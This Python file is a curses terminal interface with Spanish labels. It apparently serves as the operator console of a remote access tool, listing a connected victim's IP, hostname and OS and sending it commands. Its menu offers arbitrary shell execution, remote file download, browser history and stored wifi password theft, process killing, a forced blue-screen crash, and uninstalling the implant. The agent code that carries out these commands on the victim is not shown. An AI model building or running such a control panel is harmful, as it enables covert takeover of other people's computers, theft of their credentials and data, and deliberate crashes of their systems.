import curses
from math import ceil
from datetime import datetime

colors = {}
status_message = ""


def init_colors():
    """Inicializa los pares de colores para la interfaz."""
    curses.start_color()
    curses.use_default_colors()
    colors['header'] = 1
    colors['selected'] = 2
    colors['status_ok'] = 3
    colors['status_error'] = 4
    colors['help'] = 5

    curses.init_pair(1, curses.COLOR_BLUE, curses.COLOR_BLACK)
    curses.init_pair(2, curses.COLOR_CYAN, curses.COLOR_BLACK)
    curses.init_pair(3, curses.COLOR_GREEN, curses.COLOR_BLACK)
    curses.init_pair(4, curses.COLOR_YELLOW, curses.COLOR_BLACK)
    curses.init_pair(5, curses.COLOR_YELLOW, curses.COLOR_BLACK)


def draw_box(win, y, x, height, width):
    """Dibuja un marco alrededor de una región."""
    max_y, max_x = win.getmaxyx()
    height = min(height, max_y - y - 1)
    width = min(width, max_x - x - 1)

    win.addch(y, x, curses.ACS_ULCORNER)
    win.addch(y, x + width - 1, curses.ACS_URCORNER)
    win.addch(y + height - 1, x, curses.ACS_LLCORNER)
    win.hline(y, x + 1, curses.ACS_HLINE, width - 2)
    win.hline(y + height - 1, x + 1, curses.ACS_HLINE, width - 2)
    win.vline(y + 1, x, curses.ACS_VLINE, height - 2)
    win.vline(y + 1, x + width - 1, curses.ACS_VLINE, height - 2)
    win.addch(y + height - 1, x + width - 1, curses.ACS_LRCORNER)


# Diccionario de traducción de comandos
command_translations = {
    "Sistema": "os",
    "Matar proceso": "kill",
    "Usuarios": "users",
    "pantalla azul": "Death",
    "Procesos": "processes",
    "Unidades": "drives",
    "Archivos": "files",
    "Ver archivo": "download",
    "Red": "network",
    "Historial de navegación": "history",
    "Contraseñas de wifi": "get_wifi_passwords",
    "Servicios": "services",
    "Ejecutar comando": "shell",
    "Info del sistema": "system_info",
    "Variables de entorno": "environment",
    "Software instalado": "installed_software",
    "Conexiones de red": "network_connections",
    "Desinstalar herramienta": "Uninstall tool"
}


def get_command_args(stdscr, display_command):
    """Solicita los argumentos necesarios para un comando."""
    # Obtener el comando real basado en el nombre mostrado
    command = command_translations.get(display_command, display_command)

    command_arg_map = {
        "kill": ["pid", "Ingrese el PID del proceso a terminar: "],
        "files": ["path", "Ingrese la ruta a listar (Enter para actual): "],
        "shell": ["command", "Ingrese el comando a ejecutar: "],
        "download": ["remote_path", "Ingrese la ruta del archivo remoto: "],
    }

    if command not in command_arg_map:
        return command

    height, width = stdscr.getmaxyx()
    stdscr.clear()
    draw_box(stdscr, 0, 0, height - 1, width - 1)

    title = f"Ingrese argumentos para {display_command}"
    title_pos = max(1, (width - len(title)) // 2)
    stdscr.attron(curses.color_pair(colors['header']) | curses.A_BOLD)
    stdscr.addstr(1, title_pos, title)
    stdscr.attroff(curses.color_pair(colors['header']) | curses.A_BOLD)

    curses.echo()
    curses.curs_set(1)

    prompt = command_arg_map[command][1]
    stdscr.addstr(3, 2, prompt)
    stdscr.refresh()

    input_win = curses.newwin(1, width - len(prompt) - 4, 3, len(prompt) + 2)
    input_win.refresh()

    arg = input_win.getstr().decode('utf-8')

    curses.noecho()
    curses.curs_set(0)

    return f"{command} {arg}" if arg else command


def display_client_info(stdscr, client_serv):
    """Muestra información del cliente conectado."""
    info = [
        f"IP: {client_serv.address[0]}:{client_serv.address[1]}",
        f"Nombre del equipo: {client_serv.hostname or 'N/A'}",
        f"Sistema operativo: {client_serv.os or 'N/A'}",
        f"Última vez: {client_serv.last_seen.strftime('%Y-%m-%d %H:%M:%S')}"
    ]

    for i, line in enumerate(info):
        stdscr.addstr(i + 3, 2, line)


def display_commands(stdscr, client_serv):
    init_colors()
    curses.curs_set(0)
    current_row = 0

    # Lista de comandos en español
    if client_serv.send_command('os').split(': ')[1].split('\n')[0] == "Windows":
        display_command_list = [
            "Sistema", "Matar proceso","pantalla azul", "Usuarios", "Procesos",
            "Unidades", "Archivos", "Ver archivo", "Red",
            "Servicios", "Ejecutar comando","Historial de navegación","Contraseñas de wifi",
            "Variables de entorno", "Software instalado", "Conexiones de red"

        ]
    else:
        display_command_list = [
            "Sistema", "Matar proceso", "Usuarios", "Procesos",
            "Unidades", "Archivos", "Ver archivo", "Red",
            "Servicios", "Ejecutar comando",
            "Variables de entorno", "Software instalado", "Conexiones de red"
        ]

    try:
        client_serv.hostname = client_serv.send_command('hostname').split(': ')[1]
        client_serv.os = client_serv.send_command('os').split(': ')[1].split('\n')[0]
        print(f"{client_serv.send_command('os').split(': ')[1].split(' Versión')[0]}")
        print(f"{client_serv.os}")
    except Exception as e:
        print("Error al obtener información del cliente:", str(e))

    while True:
        stdscr.clear()
        height, width = stdscr.getmaxyx()
        safe_height = height - 1
        safe_width = width - 1

        draw_box(stdscr, 0, 0, safe_height, safe_width)

        title = f"Panel de Control - Cliente: {client_serv.address[0]}:{client_serv.address[1]}"
        title_pos = max(1, (safe_width - len(title)) // 2)
        stdscr.attron(curses.color_pair(colors['header']) | curses.A_BOLD)
        stdscr.addstr(1, title_pos, title[:safe_width - 2])
        stdscr.attroff(curses.color_pair(colors['header']) | curses.A_BOLD)

        display_client_info(stdscr, client_serv)

        commands_height = min(len(display_command_list) + 4, safe_height - 10)
        commands_width = min(30, safe_width - 4)
        commands_y = 8
        commands_x = max(1, (safe_width - commands_width) // 2)
        draw_box(stdscr, commands_y, commands_x, commands_height, commands_width)

        visible_commands = min(commands_height - 4, len(display_command_list))
        for idx in range(visible_commands):
            y = commands_y + idx + 2
            x = commands_x + 2
            if y < safe_height - 1:
                display_command = display_command_list[idx]
                if idx == current_row:
                    stdscr.attron(curses.color_pair(colors['selected']))
                    stdscr.addstr(y, x, f" {display_command} ".ljust(commands_width - 4)[:commands_width - 4])
                    stdscr.attroff(curses.color_pair(colors['selected']))
                else:
                    stdscr.addstr(y, x, display_command[:commands_width - 4])

        if status_message and safe_height > 4:
            status_y = safe_height - 2
            color = colors['status_ok'] if "[+]" in status_message else colors['status_error']
            stdscr.attron(curses.color_pair(color))
            stdscr.addstr(status_y, 2, status_message[:safe_width - 4])
            stdscr.attroff(curses.color_pair(color))

        help_text = "↑/↓: Navegar | Enter: Ejecutar | Q: Salir"
        help_pos = max(1, (safe_width - len(help_text)) // 2)
        stdscr.attron(curses.color_pair(colors['help']))
        stdscr.addstr(safe_height - 3, help_pos, help_text[:safe_width - 2])
        stdscr.attroff(curses.color_pair(colors['help']))

        stdscr.refresh()

        key = stdscr.getch()
        if key == curses.KEY_UP and current_row > 0:
            current_row -= 1
        elif key == curses.KEY_DOWN and current_row < len(display_command_list) - 1:
            current_row += 1
        elif key in (curses.KEY_ENTER, 10, 13):
            display_command = display_command_list[current_row]
            command_with_args = get_command_args(stdscr, display_command)
            try:
                output = client_serv.send_command(command_with_args)
                client_serv.last_seen = datetime.now()
                show_output(stdscr, str(output))
            except Exception as e:
                show_output(stdscr, f"Error al ejecutar el comando: {str(e)}")
        elif key == ord('q'):
            break


def show_output(stdscr, output):
    """Muestra la salida del comando en la interfaz curses con paginación."""
    height, width = stdscr.getmaxyx()
    safe_height = height - 1
    safe_width = width - 1
    lines = output.splitlines()
    pages = ceil(len(lines) / (safe_height - 7))
    current_page = 0

    while True:
        stdscr.clear()
        draw_box(stdscr, 0, 0, safe_height, safe_width)

        title = "Resultado del Comando"
        title_pos = max(1, (safe_width - len(title)) // 2)
        stdscr.attron(curses.color_pair(colors['header']) | curses.A_BOLD)
        stdscr.addstr(1, title_pos, title[:safe_width - 2])
        stdscr.attroff(curses.color_pair(colors['header']) | curses.A_BOLD)

        max_lines = safe_height - 7
        start_line = current_page * max_lines
        end_line = min(start_line + max_lines, len(lines))

        for i, line in enumerate(lines[start_line:end_line]):
            if i + 3 < safe_height - 1:
                stdscr.addstr(i + 3, 2, line[:safe_width - 4])

        if pages > 1:
            page_info = f"Página {current_page + 1}/{pages}"
            page_pos = max(1, (safe_width - len(page_info)) // 2)
            stdscr.addstr(safe_height - 3, page_pos, page_info)

        help_text = "←/→: Cambiar página | Esc: Volver"
        help_pos = max(1, (safe_width - len(help_text)) // 2)
        stdscr.attron(curses.color_pair(colors['help']))
        stdscr.addstr(safe_height - 2, help_pos, help_text)
        stdscr.attroff(curses.color_pair(colors['help']))

        stdscr.refresh()

        key = stdscr.getch()
        if key == 27:  # ESC
            break
        elif key == curses.KEY_LEFT and current_page > 0:
            current_page -= 1
        elif key == curses.KEY_RIGHT and current_page < pages - 1:
            current_page += 1


def start_client_cli(client_serv):
    """Inicia la interfaz de cliente."""
    curses.wrapper(lambda stdscr: display_commands(stdscr, client_serv))